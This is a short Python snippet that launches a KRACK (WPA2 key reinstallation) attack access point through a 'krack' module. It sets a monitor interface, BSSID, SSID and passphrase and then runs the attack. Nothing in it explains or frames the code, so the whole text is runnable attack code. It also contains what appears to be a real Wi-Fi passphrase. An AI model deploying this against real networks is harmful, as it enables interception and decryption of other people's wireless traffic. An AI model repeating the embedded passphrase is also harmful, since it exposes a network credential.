load_module("krack")
KrackAP(
    iface="wlp4s0",    # A monitor interface
    ap_mac='84:C9:B2:4A:3C:C0', # MAC (BSSID) to use
    ssid="ProDNPhotog",          # SSID
    passphrase="bernardsthebest",      # Associated passphrase
    channel=11
).run()
